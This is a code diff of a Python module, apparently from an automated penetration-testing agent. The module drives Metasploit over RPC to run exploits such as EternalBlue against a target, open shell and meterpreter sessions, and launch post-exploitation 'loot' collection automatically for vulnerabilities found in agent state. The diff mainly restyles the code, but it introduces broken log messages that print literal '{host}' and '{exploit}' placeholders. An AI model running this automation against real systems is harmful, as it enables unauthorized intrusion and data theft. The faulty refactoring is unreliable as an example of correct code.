@@ -3,17 +3,18 @@
 # Automated exploitation through Metasploit Framework
 
 import asyncio
+import contextlib
 import logging
 import socket
 import time
 from dataclasses import dataclass
 from enum import Enum
-from typing import Any
+from typing import TYPE_CHECKING, Any
 
 import aiohttp
 
-from core.state import AgentState
-import contextlib
+if TYPE_CHECKING:
+    from core.state import AgentState
 
 logger = logging.getLogger(__name__)
 
@@ -31,7 +32,7 @@ REQUESTS_AVAILABLE = False
 
 
 class SessionType(Enum):
-    """Metasploit session types"""
+    """Metasploit session types."""
 
     SHELL = "shell"
     METERPRETER = "meterpreter"
@@ -40,7 +41,7 @@ class SessionType(Enum):
 
 
 class ExploitStatus(Enum):
-    """Exploit execution status"""
+    """Exploit execution status."""
 
     SUCCESS = "success"
     FAILED = "failed"
@@ -51,7 +52,7 @@ class ExploitStatus(Enum):
 
 @dataclass
 class MSFSession:
-    """Metasploit session information"""
+    """Metasploit session information."""
 
     session_id: int
     session_type: SessionType
@@ -77,7 +78,7 @@ class MSFSession:
 
 @dataclass
 class ExploitResult:
-    """Exploit execution result"""
+    """Exploit execution result."""
 
     status: ExploitStatus
     exploit_name: str
@@ -100,8 +101,7 @@ class ExploitResult:
 
 
 class MetasploitRPC:
-    """
-    Metasploit RPC Client.
+    """Metasploit RPC Client.
 
     Supports both MSGRPC (msgpack) and REST API.
 
@@ -111,12 +111,12 @@ class MetasploitRPC:
         result = await msf.run_exploit("exploit/windows/smb/ms17_010_eternalblue", "192.168.1.100")
     """
 
-    def __init__(self, use_ssl: bool = False):
-        """
-        Initialize Metasploit RPC client.
+    def __init__(self, use_ssl: bool = False) -> None:
+        """Initialize Metasploit RPC client.
 
         Args:
             use_ssl: Use SSL for connection
+
         """
         self.host: str = ""
         self.port: int = 55553
@@ -133,8 +133,7 @@ class MetasploitRPC:
         username: str = "msf",
         password: str = "",
     ) -> bool:
-        """
-        Connect to Metasploit RPC server.
+        """Connect to Metasploit RPC server.
 
         Args:
             host: MSFRPC host
@@ -144,11 +143,12 @@ class MetasploitRPC:
 
         Returns:
             True if connected successfully
+
         """
         self.host = host
         self.port = port
 
-        logger.info(f"Connecting to Metasploit RPC at {host}:{port}")
+        logger.info("Connecting to Metasploit RPC at {host}:%s", port)
 
         try:
             # Try JSON-RPC first (more common)
@@ -182,23 +182,28 @@ class MetasploitRPC:
                         if ver and "version" in ver:
                             return True
                     except Exception as e:
-                        logger.warning(f"Msgpack auth worked but RPC call failed: {e}")
+                        logger.warning("Msgpack auth worked but RPC call failed: %s", e)
 
             logger.warning("Could not connect to Metasploit RPC")
             return False
 
         except Exception as e:
-            logger.error(f"Connection error: {e}")
+            logger.exception("Connection error: %s", e)
             return False
 
     async def _connect_msgpack(
-        self, host: str, port: int, username: str, password: str
+        self,
+        host: str,
+        port: int,
+        username: str,
+        password: str,
     ) -> bool:
-        """Connect using msgpack RPC (Async)"""
+        """Connect using msgpack RPC (Async)."""
         writer = None
         try:
             reader, writer = await asyncio.wait_for(
-                asyncio.open_connection(host, port), timeout=10
+                asyncio.open_connection(host, port),
+                timeout=10,
             )
 
             # Send auth request
@@ -223,7 +228,7 @@ class MetasploitRPC:
             return False
 
         except Exception as e:
-            logger.error(f"Msgpack RPC error: {e}")
+            logger.exception("Msgpack RPC error: %s", e)
             return False
         finally:
             if writer:
@@ -231,10 +236,10 @@ class MetasploitRPC:
                     writer.close()
                     await writer.wait_closed()
                 except Exception as e:
-                    logger.debug(f"Error closing writer: {e}")
+                    logger.debug("Error closing writer: %s", e)
 
     async def disconnect(self) -> None:
-        """Disconnect from Metasploit RPC"""
+        """Disconnect from Metasploit RPC."""
         if self.connected and self.token:
             with contextlib.suppress(Exception):
                 await self._call("auth.logout", [self.token])
@@ -244,10 +249,11 @@ class MetasploitRPC:
         logger.info("Disconnected from Metasploit RPC")
 
     async def _call(
-        self, method: str, params: list[Any] | None = None
+        self,
+        method: str,
+        params: list[Any] | None = None,
     ) -> dict[str, Any]:
-        """
-        Call RPC method.
+        """Call RPC method.
 
         Args:
             method: Method name
@@ -255,9 +261,11 @@ class MetasploitRPC:
 
         Returns:
             Response dictionary
+
         """
         if not self.connected:
-            raise ConnectionError("Not connected to Metasploit RPC")
+            msg = "Not connected to Metasploit RPC"
+            raise ConnectionError(msg)
 
         params = params or []
 
@@ -275,23 +283,23 @@ class MetasploitRPC:
                     return await response.json()
 
         except Exception as e:
-            logger.error(f"RPC call error: {e}")
+            logger.exception("RPC call error: %s", e)
             return {"error": str(e)}
 
     async def get_version(self) -> str:
-        """Get Metasploit version"""
+        """Get Metasploit version."""
         result = await self._call("core.version")
         return result.get("result", {}).get("version", "unknown")
 
     async def list_exploits(self, search: str = "") -> list[str]:
-        """
-        List available exploits.
+        """List available exploits.
 
         Args:
             search: Search filter
 
         Returns:
             List of exploit names
+
         """
         result = await self._call("module.exploits")
         exploits = result.get("result", {}).get("modules", [])
@@ -302,14 +310,14 @@ class MetasploitRPC:
         return exploits
 
     async def list_payloads(self, search: str = "") -> list[str]:
-        """
-        List available payloads.
+        """List available payloads.
 
         Args:
             search: Search filter
 
         Returns:
             List of payload names
+
         """
         result = await self._call("module.payloads")
         payloads = result.get("result", {}).get("modules", [])
@@ -320,27 +328,27 @@ class MetasploitRPC:
         return payloads
 
     async def get_exploit_info(self, exploit_name: str) -> dict[str, Any]:
-        """
-        Get exploit module information.
+        """Get exploit module information.
 
         Args:
             exploit_name: Exploit module name
 
         Returns:
             Exploit information dictionary
+
         """
         result = await self._call("module.info", ["exploit", exploit_name])
         return result.get("result", {})
 
     async def get_exploit_options(self, exploit_name: str) -> dict[str, Any]:
-        """
-        Get exploit options.
+        """Get exploit options.
 
         Args:
             exploit_name: Exploit module name
 
         Returns:
             Options dictionary
+
         """
         result = await self._call("module.options", ["exploit", exploit_name])
         return result.get("result", {})
@@ -355,8 +363,7 @@ class MetasploitRPC:
         lport: int = 4444,
         options: dict[str, Any] | None = None,
     ) -> ExploitResult:
-        """
-        Run an exploit against a target.
+        """Run an exploit against a target.
 
         Args:
             exploit_name: Exploit module name
@@ -369,12 +376,13 @@ class MetasploitRPC:
 
         Returns:
             ExploitResult object
+
         """
         start_time = time.time()
         options = options or {}
         timeout_seconds = 120  # Fixed timeout value
 
-        logger.info(f"Running exploit: {exploit_name} against {target_host}")
+        logger.info("Running exploit: {exploit_name} against %s", target_host)
 
         try:
             # Set exploit options
@@ -391,7 +399,8 @@ class MetasploitRPC:
 
             # Execute exploit
             result = await self._call(
-                "module.execute", ["exploit", exploit_name, exploit_options]
+                "module.execute",
+                ["exploit", exploit_name, exploit_options],
             )
 
             if "error" in result:
@@ -410,7 +419,7 @@ class MetasploitRPC:
             duration = time.time() - start_time
 
             if session:
-                logger.info(f"Exploit successful! Session {session.session_id} opened")
+                logger.info("Exploit successful! Session %s opened", session.session_id)
                 return ExploitResult(
                     status=ExploitStatus.SUCCESS,
                     exploit_name=exploit_name,
@@ -418,14 +427,13 @@ class MetasploitRPC:
                     session=session,
                     duration_seconds=duration,
                 )
-            else:
-                return ExploitResult(
-                    status=ExploitStatus.NO_SESSION,
-                    exploit_name=exploit_name,
-                    target=target_host,
-                    output="Exploit completed but no session was created",
-                    duration_seconds=duration,
-                )
+            return ExploitResult(
+                status=ExploitStatus.NO_SESSION,
+                exploit_name=exploit_name,
+                target=target_host,
+                output="Exploit completed but no session was created",
+                duration_seconds=duration,
+            )
 
         except TimeoutError:
             return ExploitResult(
@@ -436,7 +444,7 @@ class MetasploitRPC:
                 duration_seconds=time.time() - start_time,
             )
         except Exception as e:
-            logger.error(f"Exploit error: {e}")
+            logger.exception("Exploit error: %s", e)
             return ExploitResult(
                 status=ExploitStatus.ERROR,
                 exploit_name=exploit_name,
@@ -446,7 +454,7 @@ class MetasploitRPC:
             )
 
     async def _wait_for_session(self, target_host: str) -> MSFSession | None:
-        """Wait for a session to be created"""
+        """Wait for a session to be created."""
         timeout_seconds = 120  # Fixed timeout value
         start_time = time.time()
 
@@ -462,11 +470,11 @@ class MetasploitRPC:
         return None
 
     async def list_sessions(self) -> list[MSFSession]:
-        """
-        List active sessions.
+        """List active sessions.
 
         Returns:
             List of MSFSession objects
+
         """
         result = await self._call("session.list")
         sessions = []
@@ -489,29 +497,28 @@ class MetasploitRPC:
                         via_payload=info.get("via_payload", ""),
                         username=info.get("username", ""),
                         info=info.get("info", ""),
-                    )
+                    ),
                 )
             except Exception as e:
-                logger.error(f"Error parsing session: {e}")
+                logger.exception("Error parsing session: %s", e)
 
         return sessions
 
     async def session_shell_read(self, session_id: int) -> str:
-        """
-        Read from shell session.
+        """Read from shell session.
 
         Args:
             session_id: Session ID
 
         Returns:
             Shell output
+
         """
         result = await self._call("session.shell_read", [session_id])
         return result.get("result", {}).get("data", "")
 
     async def session_shell_write(self, session_id: int, command: str) -> bool:
-        """
-        Write command to shell session.
+        """Write command to shell session.
 
         Args:
             session_id: Session ID
@@ -519,25 +526,27 @@ class MetasploitRPC:
 
         Returns:
             True if successful
+
         """
         result = await self._call("session.shell_write", [session_id, command + "\n"])
         return result.get("result", {}).get("write_count", 0) > 0
 
     async def session_meterpreter_read(self, session_id: int) -> str:
-        """Read from meterpreter session"""
+        """Read from meterpreter session."""
         result = await self._call("session.meterpreter_read", [session_id])
         return result.get("result", {}).get("data", "")
 
     async def session_meterpreter_write(self, session_id: int, command: str) -> bool:
-        """Write command to meterpreter session"""
+        """Write command to meterpreter session."""
         result = await self._call("session.meterpreter_write", [session_id, command])
         return "error" not in result
 
     async def session_meterpreter_run_single(
-        self, session_id: int, command: str
+        self,
+        session_id: int,
+        command: str,
     ) -> str:
-        """
-        Run single meterpreter command.
+        """Run single meterpreter command.
 
         Args:
             session_id: Session ID
@@ -545,6 +554,7 @@ class MetasploitRPC:
 
         Returns:
             Command output
+
         """
         await self._call("session.meterpreter_run_single", [session_id, command])
 
@@ -553,14 +563,14 @@ class MetasploitRPC:
         return await self.session_meterpreter_read(session_id)
 
     async def kill_session(self, session_id: int) -> bool:
-        """
-        Kill a session.
+        """Kill a session.
 
         Args:
             session_id: Session ID
 
         Returns:
             True if successful
+
         """
         result = await self._call("session.stop", [session_id])
         return result.get("result") == "success"
@@ -571,8 +581,7 @@ class MetasploitRPC:
         module_name: str,
         options: dict[str, Any] | None = None,
     ) -> dict[str, Any]:
-        """
-        Run post-exploitation module.
+        """Run post-exploitation module.
 
         Args:
             session_id: Session ID
@@ -581,6 +590,7 @@ class MetasploitRPC:
 
         Returns:
             Module output
+
         """
         options = options or {}
         options["SESSION"] = session_id
@@ -590,7 +600,7 @@ class MetasploitRPC:
         return result.get("result", {})
 
     def _get_local_ip(self) -> str:
-        """Get local IP address"""
+        """Get local IP address."""
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             s.connect(("8.8.8.8", 80))
@@ -621,14 +631,14 @@ VULN_TO_EXPLOIT = {
 
 
 def suggest_exploit_for_vuln(vuln_type: str) -> str | None:
-    """
-    Suggest Metasploit exploit for vulnerability type.
+    """Suggest Metasploit exploit for vulnerability type.
 
     Args:
         vuln_type: Vulnerability type
 
     Returns:
         Exploit module name or None
+
     """
     vuln_lower = vuln_type.lower().replace("-", "_").replace(" ", "_")
 
@@ -641,10 +651,12 @@ def suggest_exploit_for_vuln(vuln_type: str) -> str | None:
 
 # State integration
 async def auto_exploit(
-    state: "AgentState", msf: MetasploitRPC, lhost: str = "", lport: int = 4444
+    state: "AgentState",
+    msf: MetasploitRPC,
+    lhost: str = "",
+    lport: int = 4444,
 ) -> list[ExploitResult]:
-    """
-    Automatically run exploits for vulnerabilities in state.
+    """Automatically run exploits for vulnerabilities in state.
 
     Args:
         state: AgentState instance
@@ -654,6 +666,7 @@ async def auto_exploit(
 
     Returns:
         List of ExploitResult objects
+
     """
     results = []
 
@@ -664,10 +677,13 @@ async def auto_exploit(
         exploit = suggest_exploit_for_vuln(vuln.vuln_id)
 
         if exploit:
-            logger.info(f"Attempting {exploit} for {vuln.vuln_id}")
+            logger.info("Attempting {exploit} for %s", vuln.vuln_id)
 
             result = await msf.run_exploit(
-                exploit_name=exploit, target_host=state.target, lhost=lhost, lport=lport
+                exploit_name=exploit,
+                target_host=state.target,
+                lhost=lhost,
+                lport=lport,
             )
 
             results.append(result)
@@ -686,7 +702,9 @@ async def auto_exploit(
                         # Create a wrapper for the MSF session to act as a shell
                         # We need to adapt the MSF session to ShellInterface
                         class MSFShellAdapter(C2ShellWrapper):
-                            def __init__(self, msf_client, session_id):
+                            """Auto-generated docstring for MSFShellAdapter class."""
+
+                            def __init__(self, msf_client, session_id) -> None:
                                 self.msf = msf_client
                                 self.sid = session_id
 
@@ -694,7 +712,8 @@ async def auto_exploit(
                                 # Determine session type and use appropriate write/read
                                 # Simplify: assume shell for now or implement meterpreter specific
                                 return await self.msf.session_shell_write(
-                                    self.sid, cmd
+                                    self.sid,
+                                    cmd,
                                 ) and await self.msf.session_shell_read(self.sid)
 
                         adapter = MSFShellAdapter(msf, result.session.session_id)
@@ -709,12 +728,12 @@ async def auto_exploit(
                         engine = PostExploitEngine(adapter, os_type)
                         loot = await engine.run()
 
-                        logger.info(f"Post-Exploitation Loot: {len(loot)} items found")
+                        logger.info("Post-Exploitation Loot: %s items found", len(loot))
                         # Store loot in state (if we extend state to hold loot)
                         # state.add_loot(loot)
 
                 except Exception as e:
-                    logger.error(f"Post-Exploitation failed: {e}")
+                    logger.exception("Post-Exploitation failed: %s", e)
                 # -------------------------------------
 
                 break
